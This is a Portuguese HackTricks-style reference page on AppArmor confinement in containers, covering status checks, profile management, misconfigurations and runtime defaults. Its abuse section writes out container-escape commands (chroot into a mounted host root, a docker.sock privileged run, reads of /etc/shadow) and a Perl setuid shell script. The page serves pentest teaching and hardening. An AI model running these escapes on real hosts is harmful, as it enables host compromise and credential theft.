# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Visão Geral

AppArmor é um sistema de **Controle de Acesso Obrigatório** que aplica restrições por meio de perfis por programa. Ao contrário das verificações tradicionais de DAC, que dependem fortemente da propriedade por usuário e grupo, o AppArmor permite que o kernel aplique uma política anexada ao próprio processo. Em ambientes de contêiner, isso importa porque uma carga de trabalho pode ter privilégios tradicionais suficientes para tentar uma ação e ainda assim ser negada porque seu perfil AppArmor não permite o caminho relevante, montagem, comportamento de rede ou uso de capability.

O ponto conceitual mais importante é que o AppArmor é **baseado em caminho**. Ele avalia o acesso ao sistema de arquivos por meio de regras de caminho em vez de rótulos, como o SELinux faz. Isso o torna acessível e poderoso, mas também significa que bind mounts e layouts de caminho alternativos merecem atenção cuidadosa. Se o mesmo conteúdo do host se tornar alcançável sob um caminho diferente, o efeito da política pode não ser o que o operador esperava inicialmente.

## Papel no Isolamento de Contêineres

Revisões de segurança de contêineres frequentemente param nas capabilities e no seccomp, mas o AppArmor continua a importar após essas verificações. Imagine um contêiner que tem mais privilégio do que deveria, ou uma carga de trabalho que precisou de uma capability extra por razões operacionais. O AppArmor ainda pode restringir acesso a arquivos, comportamento de montagem, rede e padrões de execução de maneiras que interrompem o caminho óbvio de abuso. É por isso que desativar o AppArmor "apenas para fazer a aplicação funcionar" pode silenciosamente transformar uma configuração meramente arriscada em uma que é ativamente explorável.

## Laboratório

Para verificar se o AppArmor está ativo no host, use:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Para ver sob qual usuário o processo atual do container está sendo executado:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
A diferença é instrutiva. No caso normal, o processo deve mostrar um AppArmor context vinculado ao perfil escolhido pelo runtime. No caso unconfined, essa camada extra de restrição desaparece.

Você também pode inspecionar o que o Docker acha que aplicou:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Uso em tempo de execução

Docker pode aplicar um perfil AppArmor padrão ou personalizado quando o host o suporta. O Podman também pode integrar-se ao AppArmor em sistemas baseados em AppArmor, embora em distribuições com SELinux em primeiro lugar o outro sistema MAC frequentemente ocupe o centro das atenções. O Kubernetes pode expor a política AppArmor no nível da carga de trabalho em nós que realmente suportam AppArmor. LXC e ambientes de containers de sistema relacionados da família Ubuntu também usam o AppArmor extensivamente.

O ponto prático é que o AppArmor não é um "recurso do Docker". É um recurso do kernel do host que vários runtimes podem optar por aplicar. Se o host não o suporta ou o runtime é instruído a executar unconfined, a suposta proteção na prática não existe.

Em hosts AppArmor compatíveis com Docker, o padrão mais conhecido é `docker-default`. Esse perfil é gerado a partir do template AppArmor do Moby e é importante porque explica por que alguns PoCs baseados em capabilities ainda falham em um container padrão. Em termos gerais, `docker-default` permite networking comum, nega gravações em grande parte de `/proc`, nega acesso a partes sensíveis de `/sys`, bloqueia operações de mount e restringe ptrace para que não seja uma primitiva geral de sondagem do host. Entender essa linha de base ajuda a distinguir "o container tem `CAP_SYS_ADMIN`" de "o container pode realmente usar essa capability contra as interfaces do kernel que me interessam".

## Gerenciamento de Perfis

Perfis do AppArmor normalmente ficam armazenados em `/etc/apparmor.d/`. Uma convenção de nomenclatura comum é substituir barras no caminho do executável por pontos. Por exemplo, um perfil para `/usr/bin/man` costuma ser armazenado como `/etc/apparmor.d/usr.bin.man`. Esse detalhe é importante tanto na defesa quanto na avaliação porque, uma vez que você sabe o nome do perfil ativo, frequentemente é possível localizar rapidamente o arquivo correspondente no host.

Comandos úteis de gerenciamento no host incluem:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
A razão pela qual esses comandos importam em uma referência container-security é que eles explicam como os perfis são realmente construídos, carregados, alternados para complain mode e modificados após mudanças na aplicação. Se um operador tem o hábito de mover perfis para complain mode durante a solução de problemas e esquecer de restaurar enforcement, o container pode parecer protegido na documentação enquanto se comporta de forma muito menos restrita na realidade.

### Construindo e Atualizando Perfis

`aa-genprof` pode observar o comportamento da aplicação e ajudar a gerar um perfil interativamente:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` pode gerar um perfil modelo que depois pode ser carregado com `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Quando o binário muda e a política precisa ser atualizada, `aa-logprof` pode reproduzir negações encontradas nos logs e auxiliar o operador a decidir se deve permitir ou negar essas ações:
```bash
sudo aa-logprof
```
### Registros

As negações do AppArmor costumam ser visíveis através do `auditd`, syslog, ou de ferramentas como `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Isto é útil operacionalmente e ofensivamente. Defensores o usam para refinar perfis. Atacantes o usam para descobrir qual caminho ou operação exata está sendo negada e se o AppArmor é o controle que está bloqueando um exploit chain.

### Identificando o arquivo de perfil exato

Quando um runtime mostra um nome de perfil AppArmor específico para um container, frequentemente é útil mapear esse nome de volta para o arquivo de perfil no disco:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Isto é especialmente útil durante a revisão no host porque faz a ponte entre "o container diz que está sendo executado sob o perfil `lowpriv`" e "as regras reais estão neste arquivo específico que pode ser auditado ou recarregado".

## Configurações incorretas

O erro mais óbvio é `apparmor=unconfined`. Os administradores frequentemente o habilitam enquanto depuram uma aplicação que falhou porque o perfil bloqueou corretamente algo perigoso ou inesperado. Se a flag permanecer em produção, toda a camada MAC terá sido efetivamente removida.

Outro problema sutil é assumir que bind mounts são inofensivos porque as permissões de arquivo parecem normais. Como o AppArmor é baseado em caminhos, expor caminhos do host sob locais de montagem alternativos pode interagir mal com regras de caminhos. Um terceiro erro é esquecer que o nome de um perfil em um arquivo de configuração significa muito pouco se o kernel do host não estiver realmente impondo o AppArmor.

## Abuso

Quando o AppArmor desaparece, operações que antes eram restritas podem de repente funcionar: ler caminhos sensíveis via bind mounts, acessar partes do procfs ou sysfs que deveriam continuar mais difíceis de usar, executar ações relacionadas a mount se capabilities/seccomp também as permitirem, ou usar caminhos que um perfil normalmente negaria. O AppArmor frequentemente é o mecanismo que explica por que uma tentativa de breakout baseada em capabilities "deveria funcionar" no papel mas ainda falha na prática. Remova o AppArmor, e a mesma tentativa pode começar a ter sucesso.

Se você suspeita que o AppArmor é o principal obstáculo para uma cadeia de abuso por path-traversal, bind-mount ou mount-based, o primeiro passo geralmente é comparar o que se torna acessível com e sem um perfil. Por exemplo, se um caminho do host está montado dentro do container, comece verificando se você pode percorrê-lo e lê-lo:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Se o container também tiver uma capability perigosa como `CAP_SYS_ADMIN`, um dos testes mais práticos é verificar se o AppArmor é o controle que está bloqueando operações de mount ou o acesso a sistemas de arquivos sensíveis do kernel:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
Em ambientes onde um caminho do host já está disponível através de um bind mount, perder o AppArmor também pode transformar um problema de divulgação de informação somente leitura em acesso direto a arquivos do host:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
O objetivo desses comandos não é que o AppArmor sozinho crie o breakout. É que, uma vez removido o AppArmor, muitos caminhos de abuso baseados em filesystem e mount tornam-se imediatamente testáveis.

### Exemplo Completo: AppArmor Disabled + Host Root Mounted

Se o container já tiver o host root bind-mounted em `/host`, remover o AppArmor pode transformar um caminho de abuso de filesystem bloqueado em um host escape completo:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Uma vez que o shell está sendo executado através do sistema de arquivos do host, a carga de trabalho efetivamente escapou da fronteira do container:
```bash
id
hostname
cat /etc/shadow | head
```
### Exemplo Completo: AppArmor Desativado + Runtime Socket

Se a verdadeira barreira fosse o AppArmor em torno do estado runtime, um socket montado pode ser suficiente para um escape completo:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
O caminho exato depende do ponto de montagem, mas o resultado final é o mesmo: AppArmor não está mais impedindo o acesso à API de runtime, e a API de runtime pode lançar um container que comprometa o host.

### Full Example: Path-Based Bind-Mount Bypass

Como o AppArmor é baseado em caminhos, proteger `/proc/**` não protege automaticamente o mesmo conteúdo procfs do host quando ele é acessível por um caminho diferente:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
O impacto depende do que exatamente está montado e se o caminho alternativo também contorna outros controles, mas esse padrão é uma das razões mais claras pelas quais AppArmor deve ser avaliado junto com o layout de mounts em vez de isoladamente.

### Exemplo completo: Shebang Bypass

A política do AppArmor às vezes mira um caminho do interpretador de forma que não leva completamente em conta a execução de scripts via tratamento de shebang. Um exemplo histórico envolveu usar um script cuja primeira linha aponta para um interpretador confinado:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Esse tipo de exemplo é importante como lembrete de que a intenção do perfil e a semântica real de execução podem divergir. Ao revisar o AppArmor em ambientes de container, cadeias de interpretadores e caminhos alternativos de execução merecem atenção especial.

## Checks

O objetivo dessas verificações é responder rapidamente a três perguntas: o AppArmor está habilitado no host, o processo atual está confinado, e o runtime realmente aplicou um perfil a este container?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```
O que é interessante aqui:

- Se `/proc/self/attr/current` mostra `unconfined`, a carga de trabalho não está se beneficiando do confinamento do AppArmor.
- Se `aa-status` mostra AppArmor desabilitado ou não carregado, qualquer nome de perfil na configuração em tempo de execução é na maior parte cosmético.
- Se `docker inspect` mostra `unconfined` ou um perfil customizado inesperado, isso frequentemente explica por que um caminho de abuso baseado em sistema de arquivos ou montagem funciona.

Se um container já tem privilégios elevados por razões operacionais, manter o AppArmor habilitado muitas vezes faz a diferença entre uma exceção controlada e uma falha de segurança muito mais ampla.

## Padrões em tempo de execução

| Runtime / plataforma | Estado padrão | Comportamento padrão | Enfraquecimento manual comum |
| --- | --- | --- | --- |
| Docker Engine | Enabled by default on AppArmor-capable hosts | Uses the `docker-default` AppArmor profile unless overridden | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Dependente do host | AppArmor é suportado via `--security-opt`, mas o padrão exato depende do host/runtime e é menos universal do que o perfil documentado `docker-default` do Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Padrão condicional | Se `appArmorProfile.type` não for especificado, o padrão é `RuntimeDefault`, mas ele só é aplicado quando o AppArmor está habilitado no nó | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` com um perfil fraco, nós sem suporte ao AppArmor |
| containerd / CRI-O under Kubernetes | Depende do suporte do nó/runtime | Runtimes comumente suportados pelo Kubernetes oferecem suporte ao AppArmor, mas a aplicação real ainda depende do suporte do nó e das configurações da carga de trabalho | Mesmo que na linha do Kubernetes; a configuração direta do runtime também pode ignorar o AppArmor completamente |

Para o AppArmor, a variável mais importante costuma ser o **host**, não apenas o runtime. Uma configuração de perfil em um manifesto não cria confinamento em um nó onde o AppArmor não está habilitado.
